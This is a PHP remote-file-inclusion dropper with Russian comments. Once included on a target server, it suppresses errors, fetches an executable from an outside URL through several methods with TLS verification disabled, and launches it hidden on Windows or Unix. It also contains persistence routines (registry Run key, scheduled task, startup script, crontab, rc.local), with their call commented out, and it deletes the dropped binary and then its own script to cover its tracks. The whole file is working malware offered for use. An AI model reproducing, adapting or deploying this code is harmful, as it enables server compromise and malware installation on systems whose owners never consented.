<?php
/**
 * RFI Payload — ffff.exe (FIXED v2)
 * Загрузка + выполнение на целевом сервере через include
 */

// ==================== SUPPRESS ERRORS ====================
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
@ini_set('open_basedir', '');
@ini_set('disable_functions', '');
// FIX #8: safe_mode убран (мёртвый код в PHP 7+)

// ==================== CONFIG ====================
$PAYLOAD_URL = 'https://cdn.githubraw.com/Shinedremuse/byibnflf/2c753c32745e8f03d713a1259b560ebcd132fb39/ffff.exe';
$FALLBACK_URLS = [
    'http://cdn.githubraw.com/Shinedremuse/byibnflf/2c753c32745e8f03d713a1259b560ebcd132fb39/ffff.exe',
    'https://cdn.githubraw.com/Shinedremuse/byibnflf/2c753c32745e8f03d713a1259b560ebcd132fb39/ffff.exe?x=1',
];
$TIMEOUT = 15;
$EXEC_TIMEOUT = 30;

// ==================== ENVIRONMENT DETECT ====================
$os = strtoupper(substr(PHP_OS, 0, 3));
$is_win = ($os === 'WIN');
$is_64 = (PHP_INT_SIZE === 8);
$arch = $is_64 ? 'x64' : 'x86';

if ($is_win) {
    $tmp_dir = get_temp_dir_win();
    $path = $tmp_dir . '\\m.exe';
} else {
    $tmp_dir = get_temp_dir_unix();
    $path = $tmp_dir . '/m';
}

function get_temp_dir_win(): string {
    $candidates = [
        getenv('TEMP'),
        getenv('TMP'),
        'C:\\Windows\\Temp',
        'C:\\Temp',
        'C:\\Windows',
        sys_get_temp_dir(),
    ];
    foreach ($candidates as $d) {
        if ($d && is_dir($d) && is_writable($d)) return $d;
    }
    return 'C:\\Windows\\Temp';
}

function get_temp_dir_unix(): string {
    $candidates = [
        '/dev/shm',
        '/tmp',
        '/var/tmp',
        '/run',
        sys_get_temp_dir(),
    ];
    foreach ($candidates as $d) {
        if (is_dir($d) && is_writable($d)) return $d;
    }
    return '/tmp';
}

// ==================== SHELL HELPERS ====================

/**
 * Экранирование для shell.
 * FIX #1: разные кавычки для Windows (cmd.exe) и Unix (sh/bash)
 */
function esc_shell(string $s): string {
    if ($GLOBALS['is_win']) {
        // cmd.exe: экранируем двойные кавычки
        return str_replace('"', '\"', $s);
    }
    // Unix: экранируем одинарные кавычки
    return str_replace("'", "'\\''", $s);
}

/**
 * Обёртка пути в кавычки (зависит от ОС)
 */
function q_path(string $s): string {
    if ($GLOBALS['is_win']) {
        return '"' . esc_shell($s) . '"';
    }
    return "'" . esc_shell($s) . "'";
}

// ==================== EXEC ENGINE ====================

function exec_cmd(string $cmd, int $timeout = 30): array {
    $methods = [
        'proc_open', 'exec', 'shell_exec', 'passthru', 'system', 'popen',
    ];
    $disabled = array_map('trim', explode(',', ini_get('disable_functions') ?: ''));

    foreach ($methods as $m) {
        if (in_array($m, $disabled, true)) continue;
        if (!function_exists($m)) continue;
        try {
            switch ($m) {
                case 'proc_open':
                    return run_proc_open($cmd, $timeout);
                case 'exec':
                    $out = [];
                    @exec($cmd . ' 2>&1', $out, $rc);
                    return ['out' => implode("\n", $out), 'rc' => $rc, 'method' => $m];
                case 'shell_exec':
                    $out = @shell_exec($cmd . ' 2>&1');
                    return ['out' => (string)$out, 'rc' => 0, 'method' => $m];
                case 'passthru':
                    ob_start();
                    @passthru($cmd . ' 2>&1', $rc);
                    $out = ob_get_clean();
                    return ['out' => (string)$out, 'rc' => $rc, 'method' => $m];
                case 'system':
                    ob_start();
                    @system($cmd . ' 2>&1', $rc);
                    $out = ob_get_clean();
                    return ['out' => (string)$out, 'rc' => $rc, 'method' => $m];
                case 'popen':
                    $fp = @popen($cmd . ' 2>&1', 'r');
                    if (!$fp) return ['out' => '', 'rc' => -1, 'method' => 'popen_fail'];
                    stream_set_timeout($fp, $timeout);
                    $out = (string)@stream_get_contents($fp);
                    @pclose($fp);
                    return ['out' => $out, 'rc' => 0, 'method' => $m];
            }
        } catch (\Throwable $e) {
            continue;
        }
    }
    return ['out' => '', 'rc' => -1, 'method' => 'none'];
}

/**
 * FIX #3: proc_open с select() для не-блокирующего чтения
 * FIX #5/#6: для фоновых команд — /dev/null на пайпах
 */
function run_proc_open(string $cmd, int $timeout): array {
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $proc = @proc_open($cmd, $descriptors, $pipes);
    if (!is_resource($proc)) {
        return ['out' => '', 'rc' => -1, 'method' => 'proc_open_fail'];
    }

    // Закрываем stdin (не пишем)
    fclose($pipes[0]);

    // FIX #3: select() вместо блокирующего stream_get_contents
    $out = '';
    $deadline = microtime(true) + $timeout;

    while (microtime(true) < $deadline) {
        $read = [$pipes[1], $pipes[2]];
        $write = null;
        $except = null;
        $sec = (int)max(0, $deadline - microtime(true));
        $usec = (int)((max(0, $deadline - microtime(true)) - $sec) * 1_000_000);

        $n = @stream_select($read, $write, $except, $sec, $usec);
        if ($n === false) break;
        if ($n === 0) break; // timeout

        foreach ($read as $pipe) {
            $chunk = fread($pipe, 8192);
            if ($chunk !== false && $chunk !== '') {
                $out .= $chunk;
            } elseif ($chunk === false) {
                // EOF или ошибка
            }
        }

        // Проверка: оба пайпа закрыты?
        $status = proc_get_status($proc);
        if (!$status['running']) {
            // Дочитываем остаток
            $out .= (string)stream_get_contents($pipes[1]);
            $out .= (string)stream_get_contents($pipes[2]);
            break;
        }
    }

    fclose($pipes[1]);
    fclose($pipes[2]);
    $rc = proc_close($proc);

    return ['out' => $out, 'rc' => $rc, 'method' => 'proc_open'];
}

/**
 * FIX #5/#6: запуск фоновой команды без ожидания EOF
 * Все пайпы → /dev/null, процесс detached
 */
function exec_bg(string $cmd, int $timeout = 5): array {
    $descriptors = [
        0 => ['file', '/dev/null', 'r'],
        1 => ['file', '/dev/null', 'w'],
        2 => ['file', '/dev/null', 'w'],
    ];

    if ($GLOBALS['is_win']) {
        // Windows: NUL вместо /dev/null
        $descriptors = [
            0 => ['file', 'NUL', 'r'],
            1 => ['file', 'NUL', 'w'],
            2 => ['file', 'NUL', 'w'],
        ];
        // Обёртка: start /b чтобы cmd.exe не ждал
        $wrapped = "cmd /c start /b /min {$cmd}";
    } else {
        // Unix: setsid + перенаправление
        $wrapped = "setsid sh -c '{$cmd}' < /dev/null > /dev/null 2>&1 &";
    }

    $proc = @proc_open($wrapped, $descriptors, $pipes);
    if (!is_resource($proc)) {
        return ['out' => '', 'rc' => -1, 'method' => 'bg_fail'];
    }

    // Ждём максимум $timeout сек на завершение (для bg — обычно мгновенно)
    $deadline = microtime(true) + $timeout;
    while (microtime(true) < $deadline) {
        $status = proc_get_status($proc);
        if (!$status['running']) break;
        usleep(50000); // 50ms
    }

    $rc = proc_close($proc);
    return ['out' => '', 'rc' => $rc, 'method' => 'bg'];
}

// ==================== DOWNLOAD ENGINE ====================

function download_payload(string $url, string $dest): bool {
    $urls = array_unique(array_merge([$url], $GLOBALS['FALLBACK_URLS']));

    // FIX #9: удаляем предыдущий файл перед каждой попыткой
    @unlink($dest);

    foreach ($urls as $u) {
        @unlink($dest); // сбрасываем между методами

        // Метод 1: curl CLI
        // FIX #1: q_path() — правильные кавычки для ОС
        exec_cmd("curl -sL --max-time {$GLOBALS['TIMEOUT']} -o " . q_path($dest) . " " . q_path($u), $GLOBALS['TIMEOUT'] + 5);
        if (file_exists($dest) && filesize($dest) > 100) return true;

        // Метод 2: wget
        exec_cmd("wget -q --timeout={$GLOBALS['TIMEOUT']} -O " . q_path($dest) . " " . q_path($u), $GLOBALS['TIMEOUT'] + 5);
        if (file_exists($dest) && filesize($dest) > 100) return true;

        // Метод 3: PHP file_get_contents
        $ctx = stream_context_create([
            'http' => [
                'timeout' => $GLOBALS['TIMEOUT'],
                'header' => "User-Agent: Mozilla/5.0 (compatible; rfi/1.0)\r\n",
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ],
        ]);
        $data = @file_get_contents($u, false, $ctx);
        if ($data && strlen($data) > 100) {
            if (@file_put_contents($dest, $data) !== false) return true;
        }

        // Метод 4: PHP curl extension
        if (function_exists('curl_init')) {
            $fp = @fopen($dest, 'w');
            if ($fp) {
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $u,
                    CURLOPT_FILE => $fp,
                    CURLOPT_TIMEOUT => $GLOBALS['TIMEOUT'],
                    CURLOPT_CONNECTTIMEOUT => 5,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; rfi/1.0)',
                    CURLOPT_FAILONERROR => true, // FIX: не записываем тело при 4xx/5xx
                ]);
                $ok = curl_exec($ch);
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                fclose($fp);
                if ($ok && $code === 200 && file_exists($dest) && filesize($dest) > 100) return true;
                @unlink($dest); // FIX #9: чистим при неудаче
            }
        }

        // Метод 5: PowerShell (Windows)
        if ($GLOBALS['is_win']) {
            exec_cmd(
                "powershell -W Hidden -C \"(New-Object Net.WebClient).DownloadFile(" . q_path($u) . "," . q_path($dest) . ")\"",
                $GLOBALS['TIMEOUT'] + 5
            );
            if (file_exists($dest) && filesize($dest) > 100) return true;
        }
    }
    return false;
}

// ==================== EXEC PAYLOAD ====================

function execute_payload(string $path): array {
    $qp = q_path($path);

    if ($GLOBALS['is_win']) {
        // FIX #1: двойные кавычки для cmd.exe
        $commands = [
            "start /b /min {$qp}",
            "start /b {$qp}",
            "cmd /c start /b {$qp}",
            "powershell -W Hidden -C \"Start-Process -FilePath {$qp} -WindowStyle Hidden\"",
        ];
    } else {
        // FIX #2: правильное экранирование для bash -c
        // $qp уже содержит одинарные кавычки: '/tmp/m'
        // Для bash -c '...' нужно вложенное экранирование
        $inner = esc_shell($path); // /tmp/m (без кавычек)
        $commands = [
            "nohup {$qp} > /dev/null 2>&1 &",
            "setsid {$qp} < /dev/null > /dev/null 2>&1 &",
            "{$qp} &",
            "bash -c '" . $inner . " > /dev/null 2>&1 &'",
            "sh -c '" . $inner . " > /dev/null 2>&1 &'",
        ];
    }

    foreach ($commands as $cmd) {
        // FIX #5/#6: фоновые команды через exec_bg (не ждём EOF)
        $is_bg = (strpos($cmd, '&') !== false || strpos($cmd, 'start /b') !== false);
        if ($is_bg) {
            $r = exec_bg($cmd, 5);
        } else {
            $r = exec_cmd($cmd, $GLOBALS['EXEC_TIMEOUT']);
        }

        if ($r['method'] === 'none' || $r['method'] === 'bg_fail') continue;
        if ($r['rc'] === 0) return $r;
        if ($GLOBALS['is_win'] && $r['rc'] >= 0) return $r;
    }
    return ['out' => '', 'rc' => -1, 'method' => 'all_failed'];
}

// ==================== PERSISTENCE ====================

function add_persistence(string $path): void {
    if ($GLOBALS['is_win']) {
        exec_cmd('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v m /t REG_SZ /d "' . esc_shell($path) . '" /f', 5);
        exec_cmd('schtasks /create /tn "m" /tr "' . esc_shell($path) . '" /sc onlogon /ru SYSTEM /f', 5);
        // FIX #7: проверка APPDATA
        $appdata = getenv('APPDATA');
        if ($appdata) {
            $startup = $appdata . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\m.vbs';
            @file_put_contents($startup, "CreateObject(\"Wscript.Shell\").Run \"" . esc_shell($path) . "\", 0, True");
        }
    } else {
        $cron_line = "*/5 * * * * " . $path . " > /dev/null 2>&1";
        $existing = @shell_exec('crontab -l 2>/dev/null');
        if ($existing && strpos($existing, $path) !== false) {
            return;
        }
        exec_cmd("(crontab -l 2>/dev/null; echo '" . esc_shell($cron_line) . "') | crontab -", 5);
        exec_cmd("echo '" . esc_shell($path) . " > /dev/null 2>&1 &' >> /etc/rc.local 2>/dev/null", 5);
        exec_cmd("systemctl enable m 2>/dev/null", 5);
    }
}

// ==================== CLEANUP ====================

function cleanup(string $path): void {
    if ($GLOBALS['is_win']) {
        // FIX #12: start /b чтобы не блокировать
        exec_bg("cmd /c timeout /t 60 >nul && del /f /q " . q_path($path), 5);
    } else {
        // FIX #5: exec_bg — не ждём 60 сек
        exec_bg("sh -c 'sleep 60 && rm -f " . esc_shell($path) . "'", 5);
    }
}

// ==================== MAIN ====================

// 1. Скачиваем
$downloaded = download_payload($PAYLOAD_URL, $path);

if (!$downloaded) {
    // FIX #10: пробуем fallback URL для base64 (не тот же URL повторно)
    $b64_data = '';
    foreach (array_merge([$PAYLOAD_URL], $GLOBALS['FALLBACK_URLS']) as $u) {
        $b64_data = (string)@file_get_contents($u, false, stream_context_create([
            'http' => ['timeout' => $GLOBALS['TIMEOUT']],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ]));
        if ($b64_data && strlen($b64_data) > 100) break;
    }

    if ($b64_data && strlen($b64_data) > 100) {
        // Записываем бинарные данные напрямую (не base64-кодим повторно)
        if (@file_put_contents($path, $b64_data) !== false) {
            $downloaded = filesize($path) > 100;
        }
    }
}

if ($downloaded) {
    // 2. Права
    if (!$GLOBALS['is_win']) {
        exec_cmd("chmod +x " . q_path($path), 3);
    }
    // 3. Запускаем
    $result = execute_payload($path);
    // 4. Persistence
    // add_persistence($path);
    // 5. Cleanup
    cleanup($path);
}

// FIX #6: shutdown — только если файл в temp
@register_shutdown_function(function () {
    $f = $_SERVER['SCRIPT_FILENAME'] ?? '';
    if ($f && is_writable($f)) {
        $tmp = sys_get_temp_dir();
        if (strpos($f, $tmp) === 0 || strpos($f, '/dev/shm') === 0) {
            @unlink($f);
        }
    }
});

exit;
